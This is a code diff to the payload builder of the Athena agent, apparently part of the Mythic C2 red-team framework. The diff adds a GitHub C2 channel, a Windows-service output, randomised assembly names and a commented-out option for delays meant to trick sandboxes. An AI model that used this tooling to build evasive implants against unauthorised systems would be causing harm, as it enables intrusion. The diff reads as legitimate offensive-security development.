@@ -1,6 +1,8 @@
+import string
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+from mythic_container.logging import *
 from distutils.dir_util import copy_tree
 from .athena_utils import plugin_utilities
 from .athena_utils import mac_bundler
@@ -11,8 +13,8 @@ import shutil
 import tempfile
 import traceback
 import subprocess
-import json
 import pefile
+import random
 
 
 # define your payload type class here, it must extend the PayloadType class though
@@ -26,7 +28,7 @@ class athena(PayloadType):
         SupportedOS.MacOS,
     ]  # supported OS and architecture combos
     wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
-    wrapped_payloads = []  # if so, which payload types. If you are writing a wrapper, you will need to modify this variable (adding in your wrapper's name) in the builder.py of each payload that you want to utilize your wrapper.
+    wrapped_payloads = ["aegis"]  # if so, which payload types. If you are writing a wrapper, you will need to modify this variable (adding in your wrapper's name) in the builder.py of each payload that you want to utilize your wrapper.
     note = """A cross platform .NET compatible agent."""
     supports_dynamic_loading = True  # setting this to True allows users to only select a subset of commands when generating a payload
     agent_path = pathlib.Path(".") / "athena" / "mythic"
@@ -104,6 +106,18 @@ class athena(PayloadType):
             default_value= True,
             description="Enable Stack Trace message"
         ),
+        BuildParameter(
+            name="assemblyname",
+            parameter_type=BuildParameterType.String,
+            default_value=''.join(random.choices(string.ascii_uppercase + string.digits, k=10)),
+            description="Assembly Name"
+        ),
+        # BuildParameter(
+        #     name="execution-delays",
+        #     parameter_type=BuildParameterType.ChooseMultiple,
+        #     choices = ["calculate-pi", "agent-delay", "benign-lookup"],
+        #     description="Enable execution delays to try and trick sandboxes, refer to documentation for extended information on each choice"
+        # ),
         # BuildParameter(
         #     name="optimizeforsize",
         #     parameter_type=BuildParameterType.Boolean,
@@ -119,7 +133,7 @@ class athena(PayloadType):
         BuildParameter(
             name="output-type",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["binary", "source", "app bundle"],
+            choices=["binary", "windows service", "source", "app bundle"],
             default_value="binary",
             description="Compile the payload or provide the raw source code"
         ),
@@ -130,14 +144,14 @@ class athena(PayloadType):
         #     description="Hide the window when running the payload"
         # ),
     ]
-    c2_profiles = ["http", "websocket", "slack", "smb", "discord"]
+    c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]
 
     async def prepareWinExe(self, output_path):
-        pe = pefile.PE(os.path.join(output_path, "Agent.exe"))
+        pe = pefile.PE(os.path.join(output_path, "{}.exe".format(self.get_parameter("assemblyname"))))
         pe.OPTIONAL_HEADER.Subsystem = 2
         pe.write(os.path.join(output_path, "Agent_Headless.exe"))
         pe.close()
-        os.remove(os.path.join(output_path, "Agent.exe"))
+        os.remove(os.path.join(output_path,"{}.exe".format(self.get_parameter("assemblyname"))))
         os.rename(os.path.join(output_path, "Agent_Headless.exe"), os.path.join(output_path, "Athena.exe"))
 
     async def buildSlack(self, agent_build_path, c2):
@@ -169,6 +183,21 @@ class athena(PayloadType):
         with open("{}/Agent.Profiles.Discord/DiscordProfile.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
         self.addProfile(agent_build_path, "Discord")
+
+    async def buildGitHub(self, agent_build_path, c2):
+        baseConfigFile = open("{}/Agent.Profiles.GitHub/Base.txt".format(agent_build_path.name), "r").read()
+        #baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
+        for key, val in c2.get_parameters_dict().items():
+            if key == "encrypted_exchange_check":
+                if val == "T":
+                    baseConfigFile = baseConfigFile.replace(key, "True")
+                else:
+                    baseConfigFile = baseConfigFile.replace(key, "False")  
+            else:
+                baseConfigFile = baseConfigFile.replace(str(key), str(val)) 
+        with open("{}/Agent.Profiles.GitHub/GitHubProfile.cs".format(agent_build_path.name), "w") as f:
+            f.write(baseConfigFile)
+        self.addProfile(agent_build_path, "GitHub")
 
     async def buildSMB(self, agent_build_path, c2):
         baseConfigFile = open("{}/Agent.Profiles.Smb/Base.txt".format(agent_build_path.name), "r").read()
@@ -236,7 +265,7 @@ class athena(PayloadType):
 
     def buildConfig(self, agent_build_path, c2):
         #I could modify this to be more efficient, but it doesn't take that long so screw it. Maybe later.
-        baseConfigFile = open("{}/Agent/Config/AgentConfig.cs".format(agent_build_path.name), "r").read()
+        baseConfigFile = open("{}/AthenaCore/Config/AgentConfig.cs".format(agent_build_path.name), "r").read()
         baseConfigFile = baseConfigFile.replace("%UUID%", self.uuid)
         for key, val in c2.get_parameters_dict().items():
             if key == "AESPSK":
@@ -248,23 +277,37 @@ class athena(PayloadType):
             else:
                 baseConfigFile = baseConfigFile.replace(str(key), str(val))
                     
-        with open("{}/Agent/Config/AgentConfig.cs".format(agent_build_path.name), "w") as f:
+        with open("{}/AthenaCore/Config/AgentConfig.cs".format(agent_build_path.name), "w") as f:
             f.write(baseConfigFile)
 
     # These could be combined but that's a later problem.
     def addCommand(self, agent_build_path, command_name):
         project_path = os.path.join(agent_build_path.name, command_name, "{}.csproj".format(command_name))
-        p = subprocess.Popen(["dotnet", "add", "Agent", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
-
+    
+    def addCommands(self, agent_build_path, commands):
+        #project_path = os.path.join(agent_build_path.name, command_name, "{}.csproj".format(command_name))
+        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference"] + commands, cwd=agent_build_path.name)
+        p.wait()
     def addProfile(self, agent_build_path, profile):
         project_path = os.path.join(agent_build_path.name, "Agent.Profiles.{}".format(profile), "Agent.Profiles.{}.csproj".format(profile))
-        p = subprocess.Popen(["dotnet", "add", "Agent", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
+        p.wait()
+    
+    def addAgentMod(self, agent_build_path, mod):
+        mod_map = {
+            "calculate-pi": "AgentCalculatePi",
+            "agent-delay": "AgentDelay",
+            "benign-lookup": "AgentDomainLookup",
+        }
+        project_path = os.path.join(agent_build_path.name, mod_map[mod], "{}.csproj".format(mod_map[mod]))
+        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
 
     def addCrypto(self, agent_build_path, type):
         project_path = os.path.join(agent_build_path.name, "Agent.Crypto.{}".format(type), "Agent.Crypto.{}.csproj".format(type))
-        p = subprocess.Popen(["dotnet", "add", "Agent", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", "AthenaCore", "reference", project_path], cwd=agent_build_path.name)
         p.wait()
 
     def addNuget(self, agent_build_path, package_name, project):
@@ -279,10 +322,11 @@ class athena(PayloadType):
     #def bundleApp(self, output_path):
 
 
-    async def returnSuccess(self, resp: BuildResponse, build_msg, agent_build_path) -> BuildResponse:
+    async def returnSuccess(self, resp: BuildResponse, build_msg, agent_build_path, stdout) -> BuildResponse:
         resp.status = BuildStatus.Success
         resp.build_message = build_msg
         resp.payload = open(f"{agent_build_path.name}/output.zip", 'rb').read()
+        resp.set_build_stdout(stdout)
         return resp     
     
     async def returnFailure(self, resp: BuildResponse, err_msg, build_msg) -> BuildResponse:
@@ -303,17 +347,16 @@ class athena(PayloadType):
             return "rhel-x64"
         
     async def updateRootsFile(self, agent_build_path, roots_replace):
-            baseRoots = open("{}/Agent/Roots.xml".format(agent_build_path.name), "r").read()
+            baseRoots = open("{}/AthenaCore/Roots.xml".format(agent_build_path.name), "r").read()
             baseRoots = baseRoots.replace("<!-- {{REPLACEME}} -->", roots_replace)
-            with open("{}/Agent/Roots.xml".format(agent_build_path.name), "w") as f:
+            with open("{}/AthenaCore/Roots.xml".format(agent_build_path.name), "w") as f:
                 f.write(baseRoots)   
 
-
-
     async def getBuildCommand(self, rid):
-             return "dotnet publish Agent -r {} -c {} --nologo --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} \
+            return "dotnet publish AthenaCore -r {} -c {} --nologo -v q --property WarningLevel=0 /clp:ErrorsOnly --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} \
                 /p:PublishTrimmed={} /p:Obfuscate={} /p:PublishAOT={} /p:DebugType=None /p:DebugSymbols=false /p:PluginsOnly=false \
-                /p:HandlerOS={} /p:UseSystemResourceKeys={} /p:InvariantGlobalization={} /p:StackTraceSupport={}".format(
+                /p:HandlerOS={} /p:UseSystemResourceKeys={} /p:InvariantGlobalization={} /p:StackTraceSupport={} /p:PayloadUUID={} \
+                /p:WindowsService={} /p:RandomName={}".format(
                 rid, 
                 self.get_parameter("configuration"), 
                 self.get_parameter("self-contained"), 
@@ -325,7 +368,11 @@ class athena(PayloadType):
                 self.selected_os.lower(),
                 self.get_parameter("usesystemresourcekeys"),
                 self.get_parameter("invariantglobalization"),
-                self.get_parameter("stacktracesupport"))
+                self.get_parameter("stacktracesupport"),
+                self.uuid,
+                self.get_parameter("output-type") == "windows service",
+                self.get_parameter("assemblyname")
+                )
         
     async def build(self) -> BuildResponse:
         # self.Get_Parameter returns the values specified in the build_parameters above.
@@ -337,9 +384,11 @@ class athena(PayloadType):
             if self.get_parameter("output-type") == "app bundle":
                 if self.selected_os.upper() != "MACOS":
                     return await self.returnFailure(resp, "Error building payload: App Bundles are only supported on MacOS", "Error occurred while building payload. Check stderr for more information.")
-                #self.addNuget(agent_build_path, "Dotnet.Bundle", "Agent")
+                #self.addNuget(agent_build_path, "Dotnet.Bundle", "AthenaCore")
 
-
+            if self.get_parameter("output-type") == "windows service":
+                if self.get_parameter("obfuscate") == True:
+                    return await self.returnFailure(resp, "Error building payload: Windows service's obfuscation is not supported yet.", "Error occurred while building payload. Check stderr for more information.")
 
             # Copy files into the temp directory
             copy_tree(self.agent_code_path, agent_build_path.name)
@@ -370,6 +419,9 @@ class athena(PayloadType):
                 elif profile["name"] == "discord":
                     roots_replace += "<assembly fullname=\"Agent.Profiles.Discord\"/>" + '\n'
                     await self.buildDiscord(agent_build_path, c2)
+                elif profile["name"] == "github":
+                    roots_replace += "<assembly fullname=\"Agent.Profiles.GitHub\"/>" + '\n'
+                    await self.buildGitHub(agent_build_path, c2)
                 else:
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(profile["name"]))
             
@@ -394,6 +446,7 @@ class athena(PayloadType):
 
             rid = self.getRid()   
 
+            cmdBuilder = []
             for cmd in self.commands.get_commands():
                 if cmd in unloadable_commands:
                     continue
@@ -418,10 +471,19 @@ class athena(PayloadType):
                         self.commands.add_command(shellcodeCommand)
 
                 try:
-                    self.addCommand(agent_build_path, cmd)
+                    cmdBuilder.append(os.path.join(cmd, "{}.csproj".format(cmd)))
+                    #self.addCommand(agent_build_path, cmd)
                     roots_replace += "<assembly fullname=\"{}\"/>".format(cmd) + '\n'
                 except:
                     pass
+            
+            if len(cmdBuilder) > 0:
+                self.addCommands(agent_build_path, cmdBuilder)
+            # for mod in self.get_parameter("execution-delays"):
+            #     try:
+            #         self.addAgentMod(agent_build_path, mod)
+            #     except:
+            #         pass
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -431,6 +493,8 @@ class athena(PayloadType):
             ))   
 
             await self.updateRootsFile(agent_build_path, roots_replace)
+
+            
 
             if self.get_parameter("output-type") == "source":
                 shutil.make_archive(f"{agent_build_path.name}/output", "zip", f"{agent_build_path.name}")
@@ -442,16 +506,23 @@ class athena(PayloadType):
             if(self.get_parameter("trimmed") == True):
                 command += " /p:OptimizationPreference=Size"
             
-            output_path = "{}/Agent/bin/{}/net7.0/{}/publish/".format(agent_build_path.name,self.get_parameter("configuration").capitalize(), rid)
-
+            output_path = "{}/AthenaCore/bin/{}/net8.0/{}/publish/".format(agent_build_path.name,self.get_parameter("configuration").capitalize(), rid)
 
             #Run command and get output
-            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
-                                                         stderr=asyncio.subprocess.PIPE,
-                                                         cwd=agent_build_path.name)
-            output, err = await proc.communicate()
-            print("stdout: " + str(output))
-            print("stderr: " + str(err))
+            try:
+                logger.info("Executing Command: " + command)
+                proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
+                                                            stderr=asyncio.subprocess.PIPE,
+                                                            cwd=agent_build_path.name)
+            except Exception as e:
+                build_stdout, build_stderr = await proc.communicate()
+                logger.critical(e)
+                logger.critical("command: {}".format(command))
+                return await self.returnFailure(resp, str(traceback.format_exc()), e)
+
+            build_stdout, build_stderr = await proc.communicate()
+            logger.critical("stdout: " + str(build_stdout))
+            logger.critical("stderr: " + str(build_stderr))
             sys.stdout.flush()
 
             if proc.returncode != 0:
@@ -462,7 +533,7 @@ class athena(PayloadType):
                     StepSuccess=False
                 ))
 
-                return await self.returnFailure(resp, "Error building payload: " + str(err) + '\n' + str(output) + '\n' + command, "Error occurred while building payload. Check stderr for more information.")
+                return await self.returnFailure(resp, "Error building payload: " + str(build_stdout) + '\n' + str(build_stderr) + '\n' + command, "Error occurred while building payload. Check stderr for more information.")
 
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -489,7 +560,7 @@ class athena(PayloadType):
                     StepSuccess=True
                 ))   
             
-            return await self.returnSuccess(resp, "File built succesfully!", agent_build_path)
+            return await self.returnSuccess(resp, "File built succesfully!", agent_build_path, str(build_stdout))
         except:
             return await self.returnFailure(resp, str(traceback.format_exc()), "Exception in builder.py")
     
